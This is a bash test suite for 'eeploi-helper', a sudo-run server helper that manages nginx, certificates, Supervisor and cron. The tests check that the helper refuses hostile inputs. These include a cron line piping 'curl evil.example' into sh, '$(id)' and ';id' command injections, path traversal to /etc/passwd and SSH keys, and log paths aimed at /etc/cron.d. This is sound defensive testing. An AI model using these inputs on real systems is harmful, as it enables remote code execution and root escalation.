#!/usr/bin/env bash
# Tests for eeploi-helper: bash -n, shellcheck (when installed) and many dry-run cases.
# Needs minisign, for recipe-run's signatures with a test key. Never run as root: nothing here needs it.
set -uo pipefail

ROOT=$(cd "$(dirname "$0")/.." && pwd)
HELPER="$ROOT/eeploi-helper"

if [ "$(id -u)" -eq 0 ]; then
  echo "Do not run the tests as root." >&2
  exit 1
fi

PASS=0
FAILED=0
FAILURES=""

WORK=$(mktemp -d)
trap 'rm -rf "$WORK"' EXIT

# With TESTS_PROGRESS set, that file holds the counts so far: bin/release shows them while the tests run.
progress() { [ -z "${TESTS_PROGRESS:-}" ] || printf '%s passed, %s failed\n' "$PASS" "$FAILED" > "$TESTS_PROGRESS"; }
pass() {
  PASS=$((PASS + 1))
  progress
}
failure() {
  FAILED=$((FAILED + 1))
  progress
  FAILURES="$FAILURES
  - $1"
  printf 'FAIL %s\n%s\n\n' "$1" "$2"
}

# Fixtures: /etc/eeploi variants and nginx.conf variants.
mkdir -p "$WORK/etc-empty" "$WORK/etc-new" "$WORK/etc-conf" "$WORK/etc-badline" "$WORK/etc-root" \
  "$WORK/etc-twice" "$WORK/etc-writable" "$WORK/etc-link" "$WORK/etc-inject" "$WORK/etc-newwritable"
chmod 755 "$WORK"/etc-*
touch "$WORK/etc-new/new-server"
touch "$WORK/etc-newwritable/new-server"
chmod 666 "$WORK/etc-newwritable/new-server"
printf '# eeploi\nDEPLOY_USER=deploy\n' > "$WORK/etc-conf/helper.conf"
printf 'DEPLOY_USER=deploy\nPATH=/tmp\n' > "$WORK/etc-badline/helper.conf"
printf 'DEPLOY_USER=root\n' > "$WORK/etc-root/helper.conf"
printf 'DEPLOY_USER=deploy\nDEPLOY_USER=other\n' > "$WORK/etc-twice/helper.conf"
printf 'DEPLOY_USER=deploy\n' > "$WORK/etc-writable/helper.conf"
chmod 666 "$WORK/etc-writable/helper.conf"
ln -s "$WORK/etc-conf/helper.conf" "$WORK/etc-link/helper.conf"
# shellcheck disable=SC2016
printf 'DEPLOY_USER=$(id)\n' > "$WORK/etc-inject/helper.conf"

printf 'user www-data;\nworker_processes auto;\nevents {}\n' > "$WORK/nginx-default.conf"
printf 'user ploi;\nworker_processes auto;\n' > "$WORK/nginx-ploi.conf"
printf 'user  nginx  web ; # comment\n' > "$WORK/nginx-group.conf"
printf 'worker_processes auto;\n# user nobody;\nhttp { userid on; }\n' > "$WORK/nginx-none.conf"
printf 'user www-data;\nuser ploi;\n' > "$WORK/nginx-two.conf"
printf 'user root;\n' > "$WORK/nginx-root.conf"
printf 'user www-data; include /tmp/x;\n' > "$WORK/nginx-junk.conf"
# shellcheck disable=SC2016 # the literal $(id) is the point: it must never run
printf 'user $(id);\n' > "$WORK/nginx-inject.conf"
printf 'user\twww-data;\n' > "$WORK/nginx-tab.conf"

# A literal $, for checks that look for the helper's own lines.
D='$'

# Site users: registries in <etc>/sites, one file per user. etc-sites is the default /etc/eeploi.
add_sites() {
  mkdir -p "$1/sites"
  chmod 755 "$1" "$1/sites"
  printf 'DOMAIN=shop.example\nHOME=/srv/eeploi/shop_example\nCRON=/etc/cron.d/eeploi-shop_example\nREDIS_CONF=/etc/eeploi/redis/shop_example.conf\n' > "$1/sites/shop_example"
  printf '# a comment\nDOMAIN=www.shop.example\n\n' > "$1/sites/shop_www"
  # Listed, and there, but without an _: refused all the same.
  printf 'DOMAIN=plain.example\n' > "$1/sites/shopexample"
  local user
  for user in shop_other shop_sudo shop_low shop_away shop_group shop_half shop_first; do
    printf 'DOMAIN=%s.example\n' "${user#shop_}" > "$1/sites/$user"
  done
}
add_sites "$WORK/etc-sites"
add_sites "$WORK/etc-conf"
add_sites "$WORK/etc-plain"
printf 'DOMAIN=shop.example\n' > "$WORK/etc-plain/sites/shop_example"
# The longest name: 32 characters, for db-create's socket login.
LONG_USER=b23456789012345678901234567890_2
printf 'DOMAIN=long.example\n' > "$WORK/etc-sites/sites/$LONG_USER"
# Broken registries, each in a folder of its own: the helper refuses them all.
for bad in writable link badline inject twice nodomain baddomain folder; do
  add_sites "$WORK/etc-reg-$bad"
done
chmod 666 "$WORK/etc-reg-writable/sites/shop_example"
rm "$WORK/etc-reg-link/sites/shop_example"
ln -s "$WORK/etc-sites/sites/shop_example" "$WORK/etc-reg-link/sites/shop_example"
printf 'DOMAIN=shop.example\nPATH=/tmp\n' > "$WORK/etc-reg-badline/sites/shop_example"
# shellcheck disable=SC2016 # the literal $(id) is the point: it must never run
printf 'DOMAIN=$(id)\n' > "$WORK/etc-reg-inject/sites/shop_example"
printf 'DOMAIN=shop.example\nDOMAIN=other.example\n' > "$WORK/etc-reg-twice/sites/shop_example"
printf 'HOME=/srv/eeploi/shop_example\n' > "$WORK/etc-reg-nodomain/sites/shop_example"
printf 'DOMAIN=shop\n' > "$WORK/etc-reg-baddomain/sites/shop_example"
chmod 777 "$WORK/etc-reg-folder/sites"

# What the server has (EEPLOI_HELPER_SYSTEM): users, groups, their groups (id -G), paths and running units.
# account <user> <uid> <home> <id -G>: a user with a group of its own, same name and id, and its home.
account() {
  printf 'passwd %s:x:%s:%s::%s:/usr/sbin/nologin\ngroup %s:x:%s:\nid %s:%s\npath %s\n' "$1" "$2" "$2" "$3" "$1" "$2" "$1" "$4" "$3"
}
{
  account shop_example 1001 /srv/eeploi/shop_example 1001
  account shop_www 1002 /srv/eeploi/shop_www 1002
  account shopexample 1008 /srv/eeploi/shopexample 1008
  account shop_other 1003 /srv/eeploi/shop_other 1003
  account shop_sudo 1004 /srv/eeploi/shop_sudo '1004 27'
  account shop_low 999 /srv/eeploi/shop_low 999
  account shop_first 1000 /srv/eeploi/shop_first 1000
  account shop_away 1005 /home/shop_away 1005
  echo 'passwd shop_group:x:1006:1010::/srv/eeploi/shop_group:/usr/sbin/nologin'
  echo 'group shop_group:x:1006:'
  echo 'id shop_group:1010'
  account "$LONG_USER" 1007 "/srv/eeploi/$LONG_USER" 1007
  account alex_web 1000 /home/alex_web 1000
  echo 'group shop_staff:x:1011:'
  echo 'path /srv/eeploi/shop_left'
  echo 'path /srv/eeploi'
  echo 'path /usr/bin/redis-server'
} > "$WORK/system"
grep -v redis-server "$WORK/system" > "$WORK/system-no-redis"
{ cat "$WORK/system"; echo 'active eeploi-redis@shop_example.service'; } > "$WORK/system-redis-on"
# minisign for recipe-run, wherever it is: the helper's own PATH may not have it.
MINISIGN_BIN=$(command -v minisign || echo minisign)
# A copy with a well-formed (fake) release key, to test self-update past the key check.
FAKE_KEY='RWQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
sed "s#^PUBKEY=.*#PUBKEY='$FAKE_KEY'#" "$HELPER" > "$WORK/keyed-helper"

# call <args...>: run the helper in dry-run mode. Settings (temporary per call):
#   IN (stdin), AS (SUDO_USER, default eeploi), ETC_DIR (default etc-sites), NGINX (nginx.conf), BIN (helper file),
#   DRYRUN (1 or empty), DBSTATE (what db-create's checks find), SYS (what the server has, default system),
#   VHOST (the vhost vhost-set-root rewrites), LOGS (nginx's log folder), OSREL (os-release),
#   RSTATE (recipe-run's state folder), RDL (the recipes release, a folder), RRES (steps and checks that fail),
#   ERR_TO (where stderr goes, default with stdout: /dev/null to read stdout alone)
call() {
  local dry=${DRYRUN-1}
  OUT=$(printf '%s' "${IN:-}" | env -i PATH="$PATH" \
    EEPLOI_HELPER_DRY_RUN="$dry" SUDO_USER="${AS-eeploi}" \
    EEPLOI_HELPER_ETC="${ETC_DIR:-$WORK/etc-sites}" \
    EEPLOI_HELPER_NGINX_CONF="${NGINX:-$WORK/nginx-default.conf}" \
    EEPLOI_HELPER_DB_STATE="${DBSTATE:-}" \
    EEPLOI_HELPER_SYSTEM="${SYS-$WORK/system}" \
    EEPLOI_HELPER_VHOST="${VHOST:-}" \
    EEPLOI_HELPER_NGINX_LOGS="${LOGS:-$WORK/log-nginx}" \
    EEPLOI_HELPER_OS_RELEASE="${OSREL:-$WORK/os-release}" \
    EEPLOI_HELPER_RECIPES_STATE="${RSTATE:-$WORK/recipes-none}" \
    EEPLOI_HELPER_RECIPES_DOWNLOAD="${RDL:-$WORK/rel-good}" \
    EEPLOI_HELPER_RECIPES_RESULTS="${RRES:-}" \
    EEPLOI_HELPER_MINISIGN="$MINISIGN_BIN" \
    bash "${BIN:-$HELPER}" "$@" 2> "${ERR_TO:-/dev/stdout}")
  CODE=$?
}

# ok <name> <expected output> <args...>: exit 0 and the output contains the text.
ok() {
  local name=$1 expected=$2
  shift 2
  call "$@"
  if [ "$CODE" -eq 0 ] && [[ $OUT == *"$expected"* ]]; then pass; else failure "$name" "exit $CODE, expected 0 and: $expected
$OUT"; fi
}

# lacks <name> <text> <args...>: exit 0 and the output does not contain the text.
lacks() {
  local name=$1 text=$2
  shift 2
  call "$@"
  if [ "$CODE" -eq 0 ] && [[ $OUT != *"$text"* ]]; then pass; else failure "$name" "exit $CODE, expected 0 and no: $text
$OUT"; fi
}

# refuse <name> <expected output> <args...>: exit 64 with an eeploi-helper message containing the text.
refuse() {
  local name=$1 expected=$2
  shift 2
  call "$@"
  if [ "$CODE" -eq 64 ] && [[ $OUT == *"eeploi-helper:"* ]] && [[ $OUT == *"$expected"* ]]; then pass; else failure "$name" "exit $CODE, expected 64 and: $expected
$OUT"; fi
}

# fails <name> <expected output> <args...>: exit 1 (it ran, and a step or check failed) and the output
# contains the text.
fails() {
  local name=$1 expected=$2
  shift 2
  call "$@"
  if [ "$CODE" -eq 1 ] && [[ $OUT == *"$expected"* ]]; then pass; else failure "$name" "exit $CODE, expected 1 and: $expected
$OUT"; fi
}

# absent <name> <text>: the output of the last call does not contain the text.
absent() {
  if [[ $OUT != *"$2"* ]]; then pass; else failure "$1" "has: $2
$OUT"; fi
}

# nothing_ran <name>: the last call ran no step or check.
nothing_ran() { absent "$1: nothing runs" "run: "; }

check() {
  local name=$1
  shift
  if OUT=$("$@" 2>&1); then pass; else failure "$name" "$OUT"; fi
}

echo "== syntax"
check "bash -n eeploi-helper" bash -n "$HELPER"
check "bash -n tests/run.sh" bash -n "$ROOT/tests/run.sh"
check "bash -n tests/decisions.sh" bash -n "$ROOT/tests/decisions.sh"
if command -v shellcheck > /dev/null; then
  check "shellcheck" shellcheck "$HELPER" "$ROOT/tests/run.sh" "$ROOT/tests/decisions.sh"
else
  echo "note: shellcheck is not installed, skipped (CI runs it)"
fi

echo "== decisions"
check "DECISIONS.md and the D-n comments agree" bash "$ROOT/tests/decisions.sh"
# The files git tracks, as they are now, in $WORK/dec-clean, once; each case changes one thing in a copy
# of it, $WORK/dec, which is no repo.
mkdir "$WORK/dec-clean"
(cd "$ROOT" && git ls-files | tar -cf - -T -) | (cd "$WORK/dec-clean" && tar -xf -)
dec_copy() {
  rm -rf "$WORK/dec"
  cp -R "$WORK/dec-clean" "$WORK/dec"
}
# dec_last <file>: the number of the last line of the file in the copy.
dec_last() { grep -c '' "$WORK/dec/$1"; }
# dec_edit <file> <sed script>: the file in the copy, changed (sed -i differs between macOS and GNU).
dec_edit() { sed "$2" "$WORK/dec/$1" > "$WORK/dec.tmp" && mv "$WORK/dec.tmp" "$WORK/dec/$1"; }
# dec_refuse <name> <line>: the check fails on the copy and prints that line.
dec_refuse() {
  if OUT=$(bash "$ROOT/tests/decisions.sh" "$WORK/dec" 2>&1); then
    failure "$1" "passed, expected: $2
$OUT"
  elif grep -qxF -- "$2" <<< "$OUT"; then pass; else failure "$1" "not: $2
$OUT"; fi
}
dec_ok() { check "$1" bash "$ROOT/tests/decisions.sh" "$WORK/dec"; }
dec_copy
dec_ok "decisions: the copy passes"
# A comment is "# D-n:" at the start of a line or after a space; the quotes below keep these lines none.
for f in eeploi-helper bin/release tests/run.sh .github/workflows/ci.yml minisign.pub; do
  dec_copy
  echo "# D-999: not decided" >> "$WORK/dec/$f"
  dec_refuse "decisions: an unknown D-n in $f" "$f:$(dec_last "$f"): D-999 is not in DECISIONS.md"
done
dec_copy
code='x=1 #'
echo "$code D-999: after code" >> "$WORK/dec/eeploi-helper"
dec_refuse "decisions: an unknown D-n after code" "eeploi-helper:$(dec_last eeploi-helper): D-999 is not in DECISIONS.md"
dec_copy
echo "# D-999: in a new file" > "$WORK/dec/new.sh"
dec_refuse "decisions: an unknown D-n in a new file" "new.sh:1: D-999 is not in DECISIONS.md"
dec_copy
echo "# D-13: known" >> "$WORK/dec/bin/release"
dec_ok "decisions: a known D-n in a file its Where names"
echo "# D-2: known, elsewhere" >> "$WORK/dec/bin/release"
dec_refuse "decisions: a known D-n in a file its Where doesn't name" "bin/release:$(dec_last bin/release): D-2's Where doesn't name bin/release"
dec_copy
code='x=1 #'
echo "$code D-1: ok $code D-999: and another" >> "$WORK/dec/eeploi-helper"
dec_refuse "decisions: every comment on a line counts" "eeploi-helper:$(dec_last eeploi-helper): D-999 is not in DECISIONS.md"
dec_copy
echo "x='#D-999:' # see D-999: not a comment for it" >> "$WORK/dec/eeploi-helper"
echo "# D-999: Markdown isn't read" >> "$WORK/dec/README.md"
dec_ok "decisions: a D-n that is no comment passes"
# D-1 names a file more: without its comment it fails, with one it passes.
dec_copy
# shellcheck disable=SC2016 # the backticks are Markdown
dec_edit DECISIONS.md '/^## D-1: /,/^- \*\*Where:\*\*/s/^\(- \*\*Where:\*\* .*\)$/\1, `bin\/x`/'
echo ': nothing' > "$WORK/dec/bin/x"
dec_refuse "decisions: a Where file without its comment" "bin/x: has no D-1 comment, which DECISIONS.md names it for"
echo '# D-10: another entry' >> "$WORK/dec/bin/x"
dec_refuse "decisions: D-10 is not D-1" "bin/x: has no D-1 comment, which DECISIONS.md names it for"
echo '# D-1: named' > "$WORK/dec/bin/x"
dec_ok "decisions: a Where file with its comment"
rm "$WORK/dec/bin/x"
dec_refuse "decisions: a Where file that isn't there" "DECISIONS.md: D-1: Where names bin/x, which does not exist"
dec_copy
dec_edit DECISIONS.md 's/^## D-2: /## D-3: /'
dec_refuse "decisions: a number twice" "DECISIONS.md: D-3 where D-2 comes"
dec_copy
dec_edit DECISIONS.md 's/^## D-3: /## D-2: /'
dec_refuse "decisions: a number back" "DECISIONS.md: D-2 where D-3 comes"
dec_copy
dec_edit DECISIONS.md 's/^## D-4: /## D-6: /'
dec_refuse "decisions: a number skipped" "DECISIONS.md: D-6 where D-4 comes"
for heading in '## D-2 Fixed' '## D2: Fixed' '## D-2:Fixed' '##D-2: Fixed' '### D-2: Fixed' '## Notes'; do
  dec_copy
  dec_edit DECISIONS.md "s/^## D-2: .*/$heading/"
  dec_refuse "decisions: heading $heading" "DECISIONS.md:$(grep -nxF -- "$heading" "$WORK/dec/DECISIONS.md" | cut -d: -f1): not a heading ## D-n: title"
done
dec_copy
dec_edit DECISIONS.md 's/^## For reviewers and audits$/## For audits/'
dec_refuse "decisions: the first heading" "DECISIONS.md:$(grep -nx '## For audits' "$WORK/dec/DECISIONS.md" | cut -d: -f1): not ## For reviewers and audits, heading 1"
dec_copy
dec_edit DECISIONS.md 's/^## D-8: /## D-08: /'
dec_refuse "decisions: a number with a leading zero" "DECISIONS.md:$(grep -n '^## D-08: ' "$WORK/dec/DECISIONS.md" | cut -d: -f1): not a heading ## D-n: title"
# A Where line: only files in backticks, none of them Markdown, inside an entry.
# shellcheck disable=SC2016 # the backticks are Markdown
for where in '`eeploi-helper` (the closed() check)' 'eeploi-helper' '`eeploi-helper`,`bin/release`'; do
  dec_copy
  dec_edit DECISIONS.md "/^## D-4: /,/^- \*\*Where:\*\*/s|^- \*\*Where:\*\* .*|- **Where:** $where|"
  dec_refuse "decisions: Where line $where" "DECISIONS.md:$(grep -nxF -- "- **Where:** $where" "$WORK/dec/DECISIONS.md" | cut -d: -f1): not a Where line: \`file\`, \`file\` …"
done
dec_copy
# shellcheck disable=SC2016 # the backticks are Markdown
dec_edit DECISIONS.md '/^## D-14: /,/^- \*\*Where:\*\*/s/^\(- \*\*Where:\*\* .*\)$/\1, `RELEASING.md`/'
dec_refuse "decisions: a Markdown file in Where" "DECISIONS.md: D-14: Where names RELEASING.md, but Markdown isn't read for comments"
dec_copy
# shellcheck disable=SC2016 # the backticks are Markdown
dec_edit DECISIONS.md 's/^## How entries work$/&\
\
- **Where:** `eeploi-helper`/'
# shellcheck disable=SC2016 # the backticks are Markdown
dec_refuse "decisions: a Where outside an entry" "DECISIONS.md:$(grep -n '^- \*\*Where:\*\* `eeploi-helper`$' "$WORK/dec/DECISIONS.md" | head -1 | cut -d: -f1): a Where outside an entry"
dec_copy
dec_edit DECISIONS.md '/^## How entries work$/d'
dec_refuse "decisions: no second heading" "DECISIONS.md:$(grep -n '^## D-1: ' "$WORK/dec/DECISIONS.md" | cut -d: -f1): not ## How entries work, heading 2"
dec_copy
rm "$WORK/dec/DECISIONS.md"
dec_refuse "decisions: no DECISIONS.md" "no DECISIONS.md"

echo "== existing subcommands"
ok "version" "1.1.0" version
ok "nginx-test" "run: nginx -t" nginx-test
ok "nginx-reload" "run: service nginx reload" nginx-reload
ok "php-fpm" "run: service php8.4-fpm reload" php-fpm-reload 8.4
ok "vhost" "write: /etc/nginx/sites-available/shop.example (644)" vhost-write shop.example shop_example 8.4
ok "vhost-backup" "run: cp /etc/nginx/sites-available/example.com /var/lib/eeploi/nginx/example.com/vhost" vhost-backup example.com
ok "vhost-restore" "run: cp /var/lib/eeploi/nginx/example.com/vhost /etc/nginx/sites-available/example.com" vhost-restore example.com
ok "vhost-enable" "run: ln -sfn /etc/nginx/sites-available/example.com /etc/nginx/sites-enabled/example.com" vhost-enable example.com
ok "vhost-disable" "run: rm -f /etc/nginx/sites-enabled/example.com" vhost-disable example.com
ok "vhost-remove" "run: rm -f /etc/nginx/sites-enabled/example.com /etc/nginx/sites-available/example.com" vhost-remove example.com
ok "root" "root /home/eeploi/example.com/current/public;" vhost-set-root example.com /home/ploi/example.com/public /home/eeploi/example.com/current/public
ok "vhost-set-cert" "ssl_certificate /etc/nginx/ssl/eeploi-example.com.crt;" vhost-set-cert example.com
ok "ssl-csr" "run: openssl req -new -key /etc/nginx/ssl/eeploi-example.com.key -subj /CN=example.com" ssl-csr eeploi-example.com
IN=$'-----BEGIN CERTIFICATE-----\nMIIBszCCAVmgAwIBAgIU\n-----END CERTIFICATE-----\n' ok "certificate" "write: /etc/nginx/ssl/eeploi-example.com.crt (644)" ssl-write eeploi-example.com
ok "ssl-remove" "run: rm -f /etc/nginx/ssl/example.com.crt /etc/nginx/ssl/example.com.key" ssl-remove example.com
IN='php artisan horizon' ok "supervisor" "write: /etc/supervisor/conf.d/eeploi-shop.example-horizon.conf (644)" \
  supervisor-write eeploi-shop.example-horizon shop_example /srv/eeploi/shop_example/shop.example/current 2
ok "supervisor-remove" "run: rm -f /etc/supervisor/conf.d/eeploi-example.com-a.conf" supervisor-remove eeploi-example.com-a
ok "supervisor-remove-site" "" supervisor-remove-site example.com
ok "pause" "run: mv /etc/supervisor/conf.d/worker-233475.conf /etc/supervisor/conf.d/worker-233475.conf.paused" supervisor-pause /etc/supervisor/conf.d/worker-233475.conf
ok "resume" "run: mv /etc/supervisor/conf.d/worker-233475.conf.paused /etc/supervisor/conf.d/worker-233475.conf" supervisor-resume /etc/supervisor/conf.d/worker-233475.conf
ok "supervisor-update" "run: supervisorctl update" supervisor-update
CRON_LINE=$'* * * * * shop_example php8.4 /srv/eeploi/shop_example/shop.example/current/artisan schedule:run > /dev/null 2>&1\n'
IN=$CRON_LINE ok "cron" "write: /etc/cron.d/eeploi-shop_example (644)" cron-write shop_example
ok "cron-remove" "run: rm -f /etc/cron.d/eeploi-shop_example" cron-remove shop_example
ok "crontab-restore" "add back to /etc/crontab: the lines in /var/lib/eeploi/crontab/example.com" crontab-restore example.com
IN=$'0 3 * * * ploi php /home/ploi/a/artisan x\n' ok "crontab-remove-lines" "remove from /etc/crontab: 0 3 * * * ploi php /home/ploi/a/artisan x" crontab-remove-lines example.com
IN=$'0 3 * * * ploi php /home/ploi/a/artisan x\n' ok "crontab-remove-lines saves" "save: /var/lib/eeploi/crontab/example.com" crontab-remove-lines example.com
SITE=/srv/eeploi/shop_example/shop.example
ok "env" "runuser -u shop_example -- sh -c" env-install /home/ploi/example.com/.env $SITE/.env shop_example
ok "storage-copy" "run: runuser -u ploi -- tar -C /home/ploi/a/storage -cf - . | runuser -u shop_example -- tar -C $SITE/storage -xf - --no-same-owner" storage-copy /home/ploi/a/storage $SITE/storage shop_example

echo "== refusals"
AS='' refuse "not through sudo" "run through sudo" version
AS=root refuse "root as caller" "run through sudo" version
AS=www-data refuse "other user as caller" "run through sudo" version
refuse "no subcommand" "usage"
refuse "unknown subcommand" "unknown subcommand" rm -rf /
refuse "domain with a semicolon" "invalid domain" vhost-write 'example.com;id' shop_example 8.4
refuse "domain without a dot" "invalid domain" vhost-enable localhost
refuse "domain with a slash" "invalid domain" vhost-backup ../../etc/passwd
refuse "uppercase domain" "invalid domain" vhost-enable Example.com
refuse "php version" "invalid PHP version" php-fpm-reload '8.4;id'
refuse "php version without dot" "invalid PHP version" php-fpm-reload 84
refuse "path with .." "invalid path" env-install /home/ploi/a/../../etc/shadow $SITE/.env shop_example
refuse "path outside home" "outside the allowed home folders" storage-copy /etc $SITE/storage shop_example
refuse "path in another home" "outside the allowed home folders" storage-copy /home/root/x $SITE/storage shop_example
AS=ploi refuse "ploi copies nothing" "run through sudo as the deploy user eeploi" env-install /home/ploi/a/.env /home/ploi/b/.env ploi
refuse "copy into ploi's home" "not in /srv/eeploi/shop_example" env-install /home/ploi/a/.env /home/ploi/b/.env shop_example
refuse "other owner" "reserved name, not a site user: root" env-install /home/ploi/a/.env $SITE/.env root
refuse "root as new root" "outside the allowed home folders" vhost-set-root example.com /home/ploi/x/public /etc
refuse "vhost-set-root arguments" "usage" vhost-set-root example.com /home/ploi/x/public
refuse "program name" "invalid program" supervisor-remove nginx
IN='id' refuse "daemon directory outside home" "not in $SITE" supervisor-write eeploi-shop.example-a shop_example /etc 1
IN='id' refuse "daemon directory in another home" "not in $SITE" supervisor-write eeploi-shop.example-a shop_example /home/ploi/a 1
IN='id' refuse "daemon processes" "processes must be 1 to 32" supervisor-write eeploi-shop.example-a shop_example $SITE/current 33
IN='id' refuse "daemon processes zero" "processes must be 1 to 32" supervisor-write eeploi-shop.example-a shop_example $SITE/current 0
IN='' refuse "daemon empty command" "empty command" supervisor-write eeploi-shop.example-a shop_example $SITE/current 1
IN='php artisan queue:work --name=%(program_name)s' refuse "daemon command with %" "the command cannot contain %" \
  supervisor-write eeploi-shop.example-a shop_example $SITE/current 1
IN='php -r "echo 5%2;"' refuse "daemon command with a lone %" "the command cannot contain %" \
  supervisor-write eeploi-shop.example-a shop_example $SITE/current 1
refuse "pause any file" "invalid Supervisor config" supervisor-pause /etc/passwd
IN=$'* * * * * root php /srv/eeploi/shop_example/shop.example/current/artisan schedule:run > /dev/null 2>&1\n' refuse "cron as root" "only" cron-write shop_example
IN=$'* * * * * shop_example curl evil.example | sh\n' refuse "cron any command" "only" cron-write shop_example
IN=$'* * * * * shop_example php /etc/x/artisan schedule:run > /dev/null 2>&1\n' refuse "cron outside home" "only" cron-write shop_example
refuse "certificate name" "invalid domain" ssl-csr ../../etc/passwd
refuse "crontab-remove-lines arguments" "usage" crontab-remove-lines example.com /etc/passwd

echo "== root escapes (server-access audit, 2026-11-09)"
# vhost-write: the vhost is built by the helper; caller content can't reach nginx (root opens log files).
IN=$'access_log /etc/cron.d/x;\n' refuse "vhost from stdin" "usage" vhost-write example.com
# etc-plain: a registry without a CRON line, so /etc/cron.d can only come from stdin.
IN=$'access_log /etc/cron.d/x;\n' ETC_DIR="$WORK/etc-plain" lacks "vhost ignores stdin" "/etc/cron.d" vhost-write shop.example shop_example 8.4
ok "vhost logs in /var/log/nginx" "access_log /var/log/nginx/eeploi-shop.example-access.log;" vhost-write shop.example shop_example 8.4
ok "vhost root in the site user's home" "root /srv/eeploi/shop_example/shop.example/current/public;" vhost-write shop.example shop_example 8.4
refuse "vhost socket from the PHP version" "invalid PHP version" vhost-write shop.example shop_example '8.4-fpm.sock;/tmp/evil'
# ssl-include-write: gone; take-over backups are made and restored by root (vhost-backup, vhost-restore).
IN=$'access_log /etc/cron.d/x;\n' refuse "ssl include from stdin" "unknown subcommand" ssl-include-write example.com
refuse "vhost-read gone" "unknown subcommand" vhost-read example.com
refuse "ssl-read gone" "unknown subcommand" ssl-read example.com.key
# supervisor-write: built from arguments; one command line, log in /var/log/supervisor.
IN=$'[program:eeploi-example.com-a]\ncommand=id\nuser=eeploi\nstdout_logfile=/etc/cron.d/x\n' refuse "supervisor config from stdin" "usage" supervisor-write eeploi-example.com-a
IN=$'id\nstdout_logfile=/etc/cron.d/x' refuse "supervisor extra line" "one line" supervisor-write eeploi-shop.example-a shop_example $SITE/current 1
IN='php artisan horizon' ok "supervisor log in /var/log/supervisor" "stdout_logfile=/var/log/supervisor/eeploi/shop_example/eeploi-shop.example-a.log" supervisor-write eeploi-shop.example-a shop_example $SITE/current 1
IN='php artisan horizon' ok "supervisor as the site user" "user=shop_example" supervisor-write eeploi-shop.example-a shop_example $SITE/current 1
# storage-copy and env-install: root only reads from /home/ploi or /home/forge; the site user writes.
refuse "storage from own home" "source must be in /home/ploi or /home/forge" storage-copy /home/eeploi/a/storage $SITE/storage shop_example
refuse "env from own home" "source must be in /home/ploi or /home/forge" env-install /home/eeploi/a/.env $SITE/.env shop_example
refuse "env from a site home" "source must be in /home/ploi or /home/forge" env-install /srv/eeploi/shop_www/www.shop.example/.env $SITE/.env shop_example
lacks "env not written by root" "install -o" env-install /home/ploi/a/.env $SITE/.env shop_example
lacks "storage not written by root" "rsync" storage-copy /home/ploi/a/storage $SITE/storage shop_example
# self-update: only a newer version than the installed one.
BIN="$WORK/keyed-helper" refuse "downgrade" "only a newer version" self-update 0.9.9
# crontab: only ploi or forge jobs in their home; restore adds back only those lines.
IN=$'17 * * * * root cd / && run-parts --report /etc/cron.hourly\n' refuse "system cron line" "only ploi or forge jobs" crontab-remove-lines example.com
IN=$'* * * * * ploi php /etc/x/artisan schedule:run\n' refuse "ploi job outside home" "only ploi or forge jobs" crontab-remove-lines example.com
IN='' refuse "no cron lines" "no lines given" crontab-remove-lines example.com
refuse "crontab-backup gone" "unknown subcommand" crontab-backup example.com
# ssl-write: only a PEM certificate.
IN=$'access_log /etc/cron.d/x;\n' refuse "ssl-write not a certificate" "not one PEM certificate" ssl-write example.com

echo "== second helper audit (2026-11-10)"
# env-install and storage-copy: only a .env file and a storage folder.
refuse "env source not a .env" "source must end in /.env" env-install /home/ploi/.ssh/id_ed25519 $SITE/.env shop_example
refuse "env source .env in the middle" "source must end in /.env" env-install /home/ploi/a/.env/x $SITE/.env shop_example
refuse "env source like .env" "source must end in /.env" env-install /home/forge/a/.env.backup $SITE/.env shop_example
refuse "env source a storage folder" "source must end in /.env" env-install /home/ploi/a/storage $SITE/.env shop_example
refuse "storage source not storage" "source must end in /storage" storage-copy /home/ploi/.ssh $SITE/storage shop_example
refuse "storage source the home" "source must end in /storage" storage-copy /home/forge/a $SITE/storage shop_example
refuse "storage source in storage" "source must end in /storage" storage-copy /home/ploi/a/storage/app $SITE/storage shop_example
refuse "storage source like storage" "source must end in /storage" storage-copy /home/ploi/a/old-storage $SITE/storage shop_example
ok "env from forge" "run: runuser -u forge -- dd if=/home/forge/example.com/.env iflag=nofollow" env-install /home/forge/example.com/.env $SITE/.env shop_example
ok "storage from a deploy folder" "run: runuser -u ploi -- tar -C /home/ploi/a-deploy/storage -cf -" storage-copy /home/ploi/a-deploy/storage $SITE/storage shop_example
# The panel's user reads the source, never root.
ok "env read as ploi" "run: runuser -u ploi -- dd if=/home/ploi/a/.env iflag=nofollow | runuser -u shop_example -- sh -c" env-install /home/ploi/a/.env $SITE/.env shop_example
lacks "env not read by root" "run: dd " env-install /home/ploi/a/.env $SITE/.env shop_example
lacks "storage not read by root" "run: tar " storage-copy /home/forge/a/storage $SITE/storage shop_example
ok "storage read as forge" "run: runuser -u forge -- tar -C /home/forge/a/storage -cf - ." storage-copy /home/forge/a/storage $SITE/storage shop_example
# self-update: strictly newer, compared by number.
BIN="$WORK/keyed-helper" refuse "same version" "only a newer version" self-update 1.1.0
BIN="$WORK/keyed-helper" refuse "older version" "only a newer version" self-update 0.99.99
BIN="$WORK/keyed-helper" refuse "older patch" "only a newer version" self-update 1.0.5
BIN="$WORK/keyed-helper" ok "newer patch" "download:" self-update 1.1.1
BIN="$WORK/keyed-helper" ok "newer minor" "download:" self-update 1.2.0
BIN="$WORK/keyed-helper" ok "newer major" "download:" self-update 2.0.0
# Pinned versions, so these hold whatever VERSION is: as text, 1.0.10 sorts before 1.0.9.
sed "s#^VERSION=.*#VERSION='1.0.9'#" "$WORK/keyed-helper" > "$WORK/v109-helper"
BIN="$WORK/v109-helper" ok "numbers, not text" "download:" self-update 1.0.10
sed "s#^VERSION=.*#VERSION='1.2.10'#" "$WORK/keyed-helper" > "$WORK/v1210-helper"
BIN="$WORK/v1210-helper" refuse "numbers, not text (older)" "only a newer version" self-update 1.2.9
BIN="$WORK/v1210-helper" ok "numbers, not text (newer)" "download:" self-update 1.2.11
BIN="$WORK/v1210-helper" refuse "numbers, not text (minor)" "only a newer version" self-update 1.1.99
# ssl-csr: the key is made under umask 077.
ok "ssl-csr key private from the start" "run: sh -c umask 077 && exec openssl genpkey" ssl-csr eeploi-example.com
ok "ssl-csr key mode" "run: chmod 600 /etc/nginx/ssl/eeploi-example.com.key" ssl-csr eeploi-example.com
# HOME and locale pinned; curl reads no curlrc.
check "HOME and LC_ALL pinned" grep -qx 'export TMPDIR=/tmp HOME=/root LC_ALL=C' "$HELPER"
